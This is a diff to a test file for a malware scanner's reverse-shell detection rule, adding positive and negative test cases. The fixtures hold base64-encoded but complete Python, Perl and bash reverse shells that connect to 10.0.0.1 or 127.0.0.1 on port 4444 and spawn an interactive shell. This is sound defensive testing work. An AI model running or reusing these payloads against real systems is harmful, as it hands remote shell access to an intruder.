@@ -90,6 +90,34 @@ def _reverse_shell_fixture() -> str:
     return base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx").decode()
 
 
+def _python_socket_shell_fixture() -> str:
+    """Complete Python reverse shell: socket client plus fd redirection and shell spawn.
+
+    Base64-encoded per this module's antivirus-safety convention.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9z"
+        "CnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0p"
+        "CnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDAp"
+        "Cm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcD1zdWJw"
+        "cm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK"
+    ).decode()
+
+
+def _perl_socket_shell_fixture() -> str:
+    """Complete Perl reverse shell: socket client plus stdio redirection and shell exec.
+
+    Base64-encoded per this module's antivirus-safety convention.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKJGk9IjEwLjAuMC4xIjskcD00NDQ0Owpzb2NrZXQoU09DS0VULFBG"
+        "X0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTsKY29ubmVjdChT"
+        "T0NLRVQsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpOwpvcGVuKFNURElOLCI+"
+        "JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwiPiZTT0NLRVQiKTsKb3BlbihTVERFUlIsIj4m"
+        "U09DS0VUIik7CmV4ZWMoIi9iaW4vc2ggLWkiKTsK"
+    ).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
     return any(rule_name in f.message for f in findings)
@@ -591,6 +619,78 @@ class TestBuiltInMalwarePackaging:
         )
         assert _has_rule(findings, "reverse_shell")
         assert any(f.rule_id == "YR1" for f in findings)
+
+    @pytest.mark.parametrize(
+        "content, filename",
+        [
+            (_python_socket_shell_fixture(), "shell.py"),
+            (
+                _python_socket_shell_fixture()
+                .replace("import socket,subprocess,os", "import socket,subprocess,os,pty")
+                .replace("subprocess.call", "pty.spawn"),
+                "pty_shell.py",
+            ),
+            (
+                _python_socket_shell_fixture().replace(
+                    'p=subprocess.call(["/bin/sh","-i"])', 'os.execl("/bin/sh", "sh", "-i")'
+                ),
+                "exec_shell.py",
+            ),
+            (_perl_socket_shell_fixture(), "shell.pl"),
+        ],
+    )
+    def test_builtin_reverse_shell_matches_complete_socket_shells(
+        self, content: str, filename: str
+    ) -> None:
+        assert _has_rule(_run_builtin(content, filename), "reverse_shell")
+
+    @pytest.mark.parametrize(
+        "content, filename",
+        [
+            (
+                "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+                's.connect(("10.0.0.1", 4444))\n',
+                "client.py",
+            ),
+            ("use Socket;\nsocket(SOCKET, PF_INET, SOCK_STREAM, 6);\n", "client.pl"),
+        ],
+    )
+    def test_builtin_reverse_shell_ignores_plain_socket_clients(
+        self, content: str, filename: str
+    ) -> None:
+        assert not _has_rule(_run_builtin(content, filename), "reverse_shell")
+
+    @pytest.mark.parametrize(
+        "encoded, filename",
+        [
+            (
+                "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwg"
+                "c29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMjcuMC4wLjEiLCA4MDgwKSkKc3VicHJvY2Vz"
+                "cy5ydW4oWyJkYXRlIl0sIGNoZWNrPVRydWUpCnMuc2VuZGFsbChiImhlYWx0aGNoZWNrXG4iKQpzLmNs"
+                "b3NlKCkK",
+                "client.py",
+            ),
+            (
+                "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnlu"
+                "YW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbig4MDgwLCBpbmV0X2F0b24oIjEy"
+                "Ny4wLjAuMSIpKSk7Cm9wZW4oU1RET1VULCAiPiIsICJjbGllbnQubG9nIikgb3IgZGllICQhOwpwcmlu"
+                "dCBTT0NLRVQgImhlYWx0aGNoZWNrXG4iOwpjbG9zZShTT0NLRVQpOwo=",
+                "client.pl",
+            ),
+            (
+                "aW1wb3J0IHNvY2tldCwgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5T"
+                "T0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTI3LjAuMC4xIiwgODA4MCkpCndpdGggb3BlbigiY2xpZW50"
+                "LmxvZyIsICJ3IikgYXMgbG9nZmlsZToKICAgIG9zLmR1cDIobG9nZmlsZS5maWxlbm8oKSwgMSkKcHJp"
+                "bnQoImhlYWx0aGNoZWNrIikK",
+                "redirect.py",
+            ),
+        ],
+    )
+    def test_builtin_reverse_shell_ignores_client_subprocess_and_file_logging(
+        self, encoded: str, filename: str
+    ) -> None:
+        content = base64.b64decode(encoded).decode()
+        assert not _has_rule(_run_builtin(content, filename), "reverse_shell")
 
     def test_extra_rules_still_match_with_builtin_malware_representation(self, tmp_path):
         _write_rule(
